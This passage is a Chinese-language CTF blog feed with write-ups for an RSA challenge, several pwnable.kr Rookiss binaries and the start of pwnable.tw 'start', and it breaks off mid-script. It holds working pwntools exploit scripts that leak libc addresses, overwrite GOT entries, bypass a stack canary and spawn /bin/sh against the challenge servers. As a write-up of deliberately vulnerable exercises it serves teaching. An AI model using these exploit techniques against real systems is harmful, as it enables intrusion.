title="RSAaaay"></a>RSAaaay</h2><p>题目：</p><hr><p>Hey, you’re a hacker, right? I think I am too, look at what I made!</p><p>(2531257, 43)</p><p>My super secret message: 906851 991083 1780304 2380434 438490 356019 921472 822283 817856 556932 2102538 2501908 2211404 991083 1562919 38268</p><p>Problem is, I don’t remember how to decrypt it… could you help me out? </p><hr><p>这道题还算简单，趁着去学了一点rsa。由于没有反应过来解密后的数字是合并后的ascii码，和flag擦肩而过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">c = <span class="string">'906851 991083 1780304 2380434 438490 356019 921472 822283 817856 556932 2102538 2501908 2211404 991083 1562919 38268'</span></span><br><span class="line">pub = (<span class="number">2531257</span>,<span class="number">43</span>)</span><br><span class="line">p = <span class="number">509</span></span><br><span class="line">q = <span class="number">4973</span></span><br><span class="line">r = <span class="number">2525776</span></span><br><span class="line">e = <span class="number">43</span></span><br><span class="line">l = c.split(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">dec=<span class="string">''</span></span><br><span class="line">sig=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(l)):</span><br><span class="line">    dec += str((pow(int(l[i]),<span class="number">58739</span>,pub[<span class="number">0</span>])))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(dec)):</span><br><span class="line">    sig+=dec[i]</span><br><span class="line">    <span class="keyword">if</span>(int(sig) <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7f</span>)):</span><br><span class="line">        print(chr(int(sig)),end=<span class="string">''</span>)</span><br><span class="line">        sig=<span class="string">''</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.kr[Rookiss]</title>
      <link href="/2019/02/02/pwnable-kr-Rookiss/"/>
      <url>/2019/02/02/pwnable-kr-Rookiss/</url>
      
        <content type="html"><![CDATA[<p>继续pwnable.kr的第二个难度——Rookiss</p><p>第一个难度在这里(有些题目的wp没写上去)：<a href="https://muirelle.com/2018/12/30/Pwnable-kr/" target="_blank" rel="noopener">https://muirelle.com/2018/12/30/Pwnable-kr/</a></p><p>题目链接: <a href="http://pwnable.kr/play.php" target="_blank" rel="noopener">http://pwnable.kr/play.php</a></p><a id="more"></a><h1 id="brain-fuck"><a href="#brain-fuck" class="headerlink" title="brain fuck"></a>brain fuck</h1><p>题目：</p><p><strong>Download : <a href="http://pwnable.kr/bin/bf" target="_blank" rel="noopener">http://pwnable.kr/bin/bf</a></strong></p><p><strong>Download : <a href="http://pwnable.kr/bin/bf_libc.so" target="_blank" rel="noopener">http://pwnable.kr/bin/bf_libc.so</a></strong></p><p><strong>Running at : nc pwnable.kr 9001</strong></p><p>现在题目不给源码了，越来越接近ctf的题目了。</p><p>放进ida看，主要是两个函数，<code>main</code>和<code>do_brainfuck</code></p><p><img src="https://i.imgur.com/0CRn4Bd.png" alt=""></p><p><img src="https://i.imgur.com/vn3S0Zv.png" alt=""></p><p><a href="https://zh.wikipedia.org/wiki/Brainfuck" target="_blank" rel="noopener">什么是brainfuck</a></p><p>了解了bf语言后可以知道题目本身相当于一个缺少<code>[</code>和<code>]</code>功能的bf语言，用户通过输入字符控制指针移动和读写。</p><p>看下指针一开始在什么位置</p><p><img src="https://i.imgur.com/yVRMysR.png" alt=""><br>p是指针，tape是指针指向的位置，位于bss段。</p><p>bss段距离堆和栈都太远了，<code>fgets</code>又限制了1024字节，所以不可能把指针移动到堆或栈上再操作了。</p><p><img src="https://i.imgur.com/nunHzpJ.png" alt=""></p><p>卡了半天，最后看wp才知道bss段附近不远就是got.plt段，可以直接修改plt表让原先的函数跳转到其他函数去。</p><p>接下来的思路：</p><p>把main函数的<code>memset</code>got.plt表跳转的地址覆盖成<code>gets</code>，<code>fgets</code>覆盖为<code>system</code>，最后把<code>putchar</code>覆盖成<code>main</code>。第二次进入<code>main</code>后，在执行<code>gets</code>时输入’<code>/bin/sh&#39;</code>，接着<code>system</code>就会调用该参数，拿到shell。</p><p>接下来的操作：</p><p>先将指针移动到got.plt段，打印出一个libc函数的地址后减去这个函数在libc中的偏移，就能得到libc的基址。用libc的基址加上<code>system</code>得到<code>system</code>的真实地址，同理，拿到<code>gets</code>的地址。最后按照思路写出shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">'./bf_libc.so'</span>)</span><br><span class="line">r = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9001</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (r.recvuntil(<span class="string">'except [ ]\n'</span>))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">shellcode += <span class="string">'&lt;'</span>*(<span class="number">0x0804A0A0</span><span class="number">-0x0804A010</span>)</span><br><span class="line">shellcode += <span class="string">'.&gt;'</span>*<span class="number">4</span></span><br><span class="line">shellcode += <span class="string">'&lt;'</span>*<span class="number">4</span> + <span class="string">',&gt;'</span>*<span class="number">4</span></span><br><span class="line">shellcode += <span class="string">'&lt;'</span>*<span class="number">4</span> + <span class="string">'&gt;'</span>*(<span class="number">0x0804A02C</span><span class="number">-0x0804A010</span>)</span><br><span class="line">shellcode += <span class="string">',&gt;'</span>*<span class="number">4</span></span><br><span class="line">shellcode += <span class="string">',&gt;'</span>*<span class="number">4</span></span><br><span class="line">shellcode += <span class="string">'.'</span></span><br><span class="line"></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">fgets_addr = r.recvn(<span class="number">4</span>)[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>)</span><br><span class="line">libc_base = int(fgets_addr, <span class="number">16</span>) - libc.symbols[<span class="string">'fgets'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">gets_addr = libc_base + libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line"></span><br><span class="line">r.send(p32(system_addr))</span><br><span class="line">r.send(p32(gets_addr))</span><br><span class="line">r.send(p32(<span class="number">0x8048671</span>))</span><br><span class="line">r.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flag:<strong>BrainFuck? what a weird language..</strong></p><h1 id="md5-calculator"><a href="#md5-calculator" class="headerlink" title="md5 calculator"></a>md5 calculator</h1><p>题目：</p><p><strong>Download : <a href="http://pwnable.kr/bin/hash" target="_blank" rel="noopener">http://pwnable.kr/bin/hash</a></strong></p><p><strong>Running at : nc pwnable.kr 9002</strong></p><p><img src="https://i.imgur.com/MuFJVhD.png" alt=""><br>开了canary和NX</p><p>进ida<br><img src="https://i.imgur.com/0viaAfQ.png" alt=""></p><p>这个程序的流程是：</p><p><code>my_hash</code>函数提供验证码(captcha)，输入验证码，验证成功后进入功能函数<code>process_hash</code>，该函数将用户输入的经过base64加密的密文解密之后再散列成md5发送给用户。</p><p>先看看<code>my_hash</code></p><p><img src="https://i.imgur.com/VeHY7SR.png" alt=""></p><p>开始一直不知道这个是干嘛的，也没有搜到，后面看wp猜测就是插入栈中的canary。从图中看到v10位于ebp-0xc的位置。</p><p><img src="https://i.imgur.com/c4ECOdm.png" alt=""><br>在最后验证canary值的时候是用的ebp+var_C(var_C==-0xc)也就是v10和canary初始值作比较的，所以进一步确定v10就是canary。</p><p>可以看到canary的值参与了captcha的运算，也就是说如果我们能拿到生成随机数的种子就可以反推出canary，从而绕过这个保护。</p><p>然而随机数种子就是通过<code>time(0)</code>得到的，为了避免运行脚本的时候系统时间和服务器时间不一致，把脚本放在服务器运行就可以了。</p><p>光知道了绕过canary没有栈溢出还是白搭。去看看<code>process_hash</code>。</p><p><img src="https://i.imgur.com/aqWLhJp.png" alt=""></p><p>这里fgets接收的经base64编码后的字符串，最大长度为1024字节，而转换后的原字符串长度给了512(0x200)字节的空间。但是通过计算可以知道，1024字节的base64密文解码后的长度是768字节(看了wp后表示学到了ORZ)，所以存在栈溢出。</p><p><img src="https://i.imgur.com/FNx8C4r.png" alt=""></p><p>计算好偏移之后就可以写脚本了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = time(<span class="number">0</span>);</span><br><span class="line">    srand(t);</span><br><span class="line">    <span class="keyword">int</span> r[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i)</span><br><span class="line">        r[i] = rand();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> captcha = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>, captcha - r[<span class="number">4</span>] + r[<span class="number">6</span>] - r[<span class="number">7</span>] - r[<span class="number">2</span>] + r[<span class="number">3</span>] - r[<span class="number">1</span>] - r[<span class="number">5</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9002</span>)</span><br><span class="line"><span class="keyword">print</span> (r.recvuntil(<span class="string">'captcha : '</span>))</span><br><span class="line"></span><br><span class="line">captcha = r.recv().strip()</span><br><span class="line"><span class="keyword">print</span> (captcha)</span><br><span class="line">r.sendline(captcha)</span><br><span class="line">captcha = int(captcha)</span><br><span class="line"><span class="keyword">print</span> (r.recvuntil(<span class="string">'paste me!\n'</span>))</span><br><span class="line"></span><br><span class="line">cookie = int(os.popen(<span class="string">"./noxus %d"</span>%captcha).read())</span><br><span class="line"></span><br><span class="line">g_buf = <span class="number">0x804b0e0</span></span><br><span class="line">binsh_addr = (len(payload)+<span class="string">'a'</span>*<span class="number">4</span>)*<span class="number">3</span>/<span class="number">4</span><span class="comment">#payload的长度*0.75就是'binsh'在g_buf中的位置</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">512</span><span class="comment">#padding</span></span><br><span class="line">payload += p32(cookie)<span class="comment">#canary</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0xc</span><span class="comment">#padding</span></span><br><span class="line">payload += p32(<span class="number">0x8048880</span>)<span class="comment">#system地址</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">4</span><span class="comment">#原本此位置是system返回地址，用不到，所以padding。</span></span><br><span class="line">payload += p32(g_buf+(<span class="number">512</span>+<span class="number">4</span>+<span class="number">12</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span>)*<span class="number">4</span>/<span class="number">3</span>)<span class="comment">#'binsh'位置在g_buf中，payload编码后长度要*4/3</span></span><br><span class="line"></span><br><span class="line">payload = b64e(payload) + <span class="string">'/bin/sh\0'</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>写好脚本后随便找一个之前的题目进服务器，然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ <span class="built_in">cd</span> /tmp/</span><br><span class="line">fd@ubuntu:/tmp$ vim noxus.c</span><br><span class="line">fd@ubuntu:/tmp$ gcc -o noxus noxus.c</span><br><span class="line">fd@ubuntu:/tmp$ vim demacia.py</span><br><span class="line">fd@ubuntu:/tmp$ python demacia.py</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/VFPVbNk.png" alt=""></p><p>笔记：</p><p>1、字符串经某种方式编码或解码后长度会发生改变，通常编码或解码后的长度是可计算的，若内存没有合理分配则可能导致栈溢出。</p><p>2、可以利用题目中混杂canary的计算推出canary的值。</p><p>3、不将/bin/sh放在栈上是因为无法通过base64解码出一个空字符(base64不可编码/解码空字符)，导致无法控制system参数。所以选择在bss段的g_buf上放置未加密的’/bin/sh’。</p><h1 id="simple-login"><a href="#simple-login" class="headerlink" title="simple login"></a>simple login</h1><p>题目：</p><p><strong>Download : <a href="http://pwnable.kr/bin/login" target="_blank" rel="noopener">http://pwnable.kr/bin/login</a></strong></p><p><strong>Running at : nc pwnable.kr 9003</strong></p><p>看到这题好多函数都和上一题一样，还以为又要栽了，结果比想象中简单。。。flag概括了整道题的考点hhh</p><p>flag： <strong>control EBP, control ESP, control EIP, control the world~</strong></p><p>进ida，main函数</p><p><img src="https://i.imgur.com/yz6zqos.png" alt=""><br>把关键部分找出来，然后仔细审计，弄清楚流程</p><p>从上图看出：程序从用户读取base64编码后的字符串，经<code>Base64Decode</code>解码后的字符串的长度放在<code>v6</code>，址放在<code>v4</code>，并且要求<code>v6</code>要小于等于12(0xc)。然后通过<code>memcpy</code>把解码后的字符串放在一个bss段的变量<code>input</code>中，接着，若<code>auth</code>返回值为1就调用<code>correct</code>从而拿到shell。</p><p>所以进<code>auth</code>看看<br><img src="https://i.imgur.com/FWCFwrN.png" alt=""><br>通过控制main函数中v6值为12，则<code>auth</code>中a1为12，则在执行<code>memcpy</code>时就会将12字节的数据复制到只有4字节大小的v4上，又注意到v4在栈中的位置为<code>ebp-8h</code>，所以最后的四个字节会将ebp覆盖掉。</p><p>控制了ebp之后，esp就好说了。</p><p>虽然在这个函数返回时esp并不会被影响，但在下一个函数返回之前执行leave指令时，ebp的值就会赋给esp，从而间接控制esp。</p><p><img src="https://i.imgur.com/6HIcjQn.png" alt=""><br>构造输入后的字符串经base63解码后是这个样子就行了。(红框内是溢出部分)system_addr不放在开头的原因是因为leave中还有一个pop ebp的操作，esp相应的会+4，所以system_addr往后放了4个字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9003</span>)</span><br><span class="line"><span class="keyword">print</span> (r.recvuntil(<span class="string">'Authenticate : '</span>))</span><br><span class="line">payload = b64e(<span class="string">'a'</span>*<span class="number">4</span>+p32(<span class="number">0x08049284</span>)+p32(<span class="number">0x0811eb40</span>))</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> (r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/FyOG7Ko.png" alt=""></p><p>笔记：</p><p>1、控制ebp可以间接控制esp，进而控制eip，从而劫持函数流。</p><p>2、一开始本来打算esp指向栈中的system，但是无法成功调用，只有指向bss段的system才能成功调用。目前还不清楚原因。</p><h1 id="otp"><a href="#otp" class="headerlink" title="otp"></a>otp</h1><p>题目：<strong>ssh <a href="mailto:otp@pwnable.kr" target="_blank" rel="noopener">otp@pwnable.kr</a> -p2222 (pw:guest)</strong></p><p>想了半天，找不到溢出点，结果不是溢出。。。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> fname[<span class="number">128</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> otp[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"usage : ./otp [passcode]\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>) <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(read(fd, otp, <span class="number">16</span>)!=<span class="number">16</span>) <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(fname, <span class="string">"/tmp/%llu"</span>, otp[<span class="number">0</span>]);</span><br><span class="line">FILE* fp = fopen(fname, <span class="string">"w"</span>);</span><br><span class="line"><span class="keyword">if</span>(fp==<span class="literal">NULL</span>)&#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;</span><br><span class="line">fwrite(&amp;otp[<span class="number">1</span>], <span class="number">8</span>, <span class="number">1</span>, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"OTP generated.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> passcode=<span class="number">0</span>;</span><br><span class="line">FILE* fp2 = fopen(fname, <span class="string">"r"</span>);</span><br><span class="line"><span class="keyword">if</span>(fp2==<span class="literal">NULL</span>)&#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;</span><br><span class="line">fread(&amp;passcode, <span class="number">8</span>, <span class="number">1</span>, fp2);</span><br><span class="line">fclose(fp2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strtoul(argv[<span class="number">1</span>], <span class="number">0</span>, <span class="number">16</span>) == passcode)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"OTP mismatch\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unlink(fname);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码用urandom生成了16字节的随机数，前八字节作为一个文件名，后八字节作为这个文件的内容，如果用户输入和文件内容相同则拿到flag。</p><p>解题的关键就是用<code>ulimit -f 0</code>命令将用户可创建文件的大小置零，于是源码中创建文件的语句得不到执行，最后读取文件内容就是空字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/user/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">subprocess.Popen([<span class="string">'/home/otp/otp'</span>, <span class="string">''</span>], stderr=subprocess.STDOUT)</span><br></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title="#"></a>#</h1>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.tw</title>
      <link href="/2019/01/21/Pwnable-tw/"/>
      <url>/2019/01/21/Pwnable-tw/</url>
      
        <content type="html"><![CDATA[<p>题目链接：<a href="https://pwnable.tw/" target="_blank" rel="noopener">https://pwnable.tw/</a></p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>题目：</p><p><a href="https://pwnable.tw/static/chall/start" target="_blank" rel="noopener">https://pwnable.tw/static/chall/start</a></p><p><strong>nc chall.pwnable.tw 10000</strong></p><p><img src="https://i.imgur.com/j9piDw5.png" alt=""><br>32位，静态链接</p><p><img src="https://i.imgur.com/NzkCLTV.png" alt=""></p><p>输入一些东西之后没什么反应</p><p><img src="https://i.imgur.com/XtqjB0q.png" alt=""></p><p>可以看到</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0804806e</span> &lt;+<span class="number">14</span>&gt;:    <span class="keyword">push</span>   <span class="number">0x3a465443</span></span><br><span class="line"><span class="number">0x08048073</span> &lt;+<span class="number">19</span>&gt;:    <span class="keyword">push</span>   <span class="number">0x20656874</span></span><br><span class="line"><span class="number">0x08048078</span> &lt;+<span class="number">24</span>&gt;:    <span class="keyword">push</span>   <span class="number">0x20747261</span></span><br><span class="line"><span class="number">0x0804807d</span> &lt;+<span class="number">29</span>&gt;:    <span class="keyword">push</span>   <span class="number">0x74732073</span></span><br><span class="line"><span class="number">0x08048082</span> &lt;+<span class="number">34</span>&gt;:    <span class="keyword">push</span>   <span class="number">0x2774654c</span></span><br></pre></td></tr></table></figure><p>这一段就是 <strong>Let’s start the CTF:</strong></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x08048087</span> &lt;+<span class="number">39</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="built_in">esp</span>  <span class="comment">;要写的数据的地址</span></span><br><span class="line"><span class="number">0x08048089</span> &lt;+<span class="number">41</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">dl</span>,<span class="number">0x14</span>  <span class="comment">;要写的数据长度</span></span><br><span class="line"><span class="number">0x0804808b</span> &lt;+<span class="number">43</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">bl</span>,<span class="number">0x1</span>   <span class="comment">;文件描述符file descriptor (stdout)</span></span><br><span class="line"><span class="number">0x0804808d</span> &lt;+<span class="number">45</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">al</span>,<span class="number">0x4</span>   <span class="comment">;系统调用码system call number (sys_write)</span></span><br><span class="line"><span class="number">0x0804808f</span> &lt;+<span class="number">47</span>&gt;:    <span class="keyword">int</span>    <span class="number">0x80</span>     <span class="comment">;调用内核call kernel</span></span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x08048091</span> &lt;+<span class="number">49</span>&gt;:    <span class="keyword">xor</span>    <span class="built_in">ebx</span>,<span class="built_in">ebx</span>  <span class="comment">;文件描述符file descriptor (stdin)</span></span><br><span class="line"><span class="number">0x08048093</span> &lt;+<span class="number">51</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">dl</span>,<span class="number">0x3c</span>  <span class="comment">;数据长度</span></span><br><span class="line"><span class="number">0x08048095</span> &lt;+<span class="number">53</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">al</span>,<span class="number">0x3</span>   <span class="comment">;系统调用码system call number (sys_read)</span></span><br><span class="line"><span class="number">0x08048097</span> &lt;+<span class="number">55</span>&gt;:    <span class="keyword">int</span>    <span class="number">0x80</span>     <span class="comment">;调用内核call kernel</span></span><br></pre></td></tr></table></figure><p>分别是两段linux的系统调用(<a href="https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm" target="_blank" rel="noopener">Linux System Call</a>)</p><p>分别调用了write和read，用于将刚刚那句提示信息输出到屏幕和读取我们输入的数据。</p><p>下个断点看看<br><img src="https://i.imgur.com/BoS1Nha.png" alt=""></p><p>覆盖了ret的地址</p><p>再看一下开了什么保护</p><p><img src="https://i.imgur.com/slEapRE.png" alt=""><br>emm什么都没开，本来一开始是想ret2libc的，但是找了半天的gadgets想ROP结果白忙活一场，后来查了一下发现由于这个文件是静态链接生成的(statically linked)，没办法ret2libc，所以自然想到ret2shellcode</p><p>现在的问题就是要在栈上找个位置放shellcode。</p><p>注意到程序一开始将esp的值push到栈里了，而且经过gdb调试发现ret返回后这个值刚好在栈顶，所以，将ret的值覆盖为<strong>0x8048087</strong>，于是再一次调用write将栈顶的值泄露出来。<br><img src="https://i.imgur.com/fnyJlAe.png" alt=""></p><p>在第二轮write和read后，ret之前，栈中期待的效果是这样<br><img src="https://i.imgur.com/YDjWNVj.png" alt=""></p><p>黄色为20个字节的padding，红色是已经被泄露出来的栈地址，蓝色是将要填充的第二次ret地址，所以应该跟在他后面，为<strong>0xbffff734</strong> = <strong>泄露的esp</strong> + <strong>20</strong>，橙色部分则为shellcode。</p><p>由此构造出最后脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10000</span>)</span><br><span class="line"><span 